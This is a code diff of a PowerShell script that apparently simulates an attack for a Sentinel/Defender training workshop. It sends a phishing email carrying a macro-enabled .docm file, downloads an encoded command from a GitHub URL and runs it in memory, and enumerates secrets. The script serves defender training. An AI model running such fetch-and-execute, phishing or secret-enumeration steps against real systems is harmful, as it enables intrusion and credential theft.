@@ -37,7 +37,7 @@ function CreateScheduledTask($name, $scriptPath, $localPath, $user, $password)
 #executes phishing attack
 function SendEmail($userEmail, $attachment)
 {
-    $password = "#PASSWORD#" | ConvertTo-SecureString
+    $password = "#PASSWORD#" | ConvertTo-SecureString -AsPlainText -Force
 
     $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "#USERNAME#", $password;
 
@@ -62,7 +62,10 @@ function SendEmail($userEmail, $attachment)
 function ExecuteDocm()
 {
     #execute the docm (manually)
-    SendEmail $username "DataLossReport.docm"
+    SendEmail $username "DataLossReport.docm";
+
+    #open window to mail - small hint to user.
+    start-process "https://outlook.office.com/mail/inbox";
 
     #add a record somewhere the docm was opened...copy the word doc to the downloads...
     $downloadsPath = $env:userprofile + "\Downloads";
@@ -84,10 +87,10 @@ function ExecuteDocm()
     $password = "#PASSWORD#";
 
     #execute an in-memory powershell attack
-    $encodedCommand = Invoke-WebRequest "https://raw.githubusercontent.com/solliancenet/sentinel-defender-workshop-400/main/artifacts/day-02/Enumerate.txt"
+    $encodedCommand = Invoke-WebRequest "https://raw.githubusercontent.com/solliancenet/#WORKSHOP_NAME#/main/artifacts/day-02/Enumerate.txt" -UseBasicParsing
     
     #do it...
-    powershell.exe -noprofile -command $username, $password | powershell -noprofile -encodedcommand $encodedCommand;
+    powershell.exe -noprofile -command $username, $password | powershell -noprofile -encodedcommand $encodedCommand.Content;
 
     #enumerate all secrets
     powershell.exe -encodedCommand $data;
@@ -161,9 +164,6 @@ mkdir c:\tools -ea SilentlyContinue;
 
 $path = "C:\labfiles\#WORKSHOP_NAME#\artifacts\day-02";
 cd $path;
-
-#send the email to the user - another hint...
-SendEmail $username;
 
 #do the attack manually...
 ExecuteDocm
